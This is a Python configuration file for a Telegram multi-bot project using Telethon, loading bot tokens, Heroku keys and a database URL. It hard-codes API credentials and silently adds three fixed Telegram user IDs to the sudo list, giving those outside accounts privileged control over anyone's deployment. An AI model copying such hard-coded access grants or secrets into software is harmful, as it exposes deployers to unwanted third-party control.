import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging

logging.basicConfig(
    format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
    level=logging.WARNING
)

# Basic values
API_ID = 18136872
API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)

# Tokens
BOT_TOKENS = [
    config("BOT_TOKEN", default=None),
    config("BOT_TOKEN2", default=None),
    config("BOT_TOKEN3", default=None),
    config("BOT_TOKEN4", default=None),
    config("BOT_TOKEN5", default=None),
    config("BOT_TOKEN6", default=None),
    config("BOT_TOKEN7", default=None),
    config("BOT_TOKEN8", default=None),
    config("BOT_TOKEN9", default=None),
    config("BOT_TOKEN10", default=None),
]

# Sudo & Owner
SUDO_USERS = list(map(int, getenv("SUDO_USER", "0").split()))
SUDO_USERS += [6919199044, 6762113050, 6876910746]

OWNER_ID = int(os.environ.get("OWNER_ID", 0))
SUDO_USERS.append(OWNER_ID)

# DB
DB_URI = config("DATABASE_URL", None)

# Clients (Initialized only — actual start will happen asynchronously)
clients = []
for i in range(len(BOT_TOKENS)):
    if BOT_TOKENS[i]:
        session = f"MK{i+1}"
        clients.append(TelegramClient(session, API_ID, API_HASH))

# Usage:
# from config import clients, BOT_TOKENS
# await clients[i].start(bot_token=BOT_TOKENS[i])
